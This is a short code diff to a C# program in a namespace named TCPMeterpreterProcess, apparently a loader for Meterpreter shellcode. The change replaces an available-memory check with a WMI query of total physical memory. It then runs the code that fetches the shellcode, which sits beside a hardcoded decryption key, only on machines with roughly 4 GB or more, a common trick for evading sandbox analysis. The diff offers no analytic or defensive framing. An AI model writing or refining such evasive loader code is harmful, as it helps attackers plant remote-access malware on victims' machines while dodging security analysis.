@@ -42,8 +42,14 @@ namespace TCPMeterpreterProcess
         static void Main(string[] args)
         {
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
-            PerformanceCounter ramCounter = new PerformanceCounter("Memory", "Available MBytes");
-            if (ramCounter.NextValue() >= 4096)
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
+            double totalMemoryMb = 0;
+            foreach (ManagementObject obj in searcher.Get())
+            {
+                ulong totalMemoryBytes = (ulong)obj["TotalPhysicalMemory"];
+                totalMemoryMb = (totalMemoryBytes / 1024f) / 1024f;
+            }
+            if (totalMemoryMb >= 3999)
             {
                 byte[] shellcode = GetShellCode();
                 string key = "BsijVUv2v+Ql/NM3pQv8uQ==";
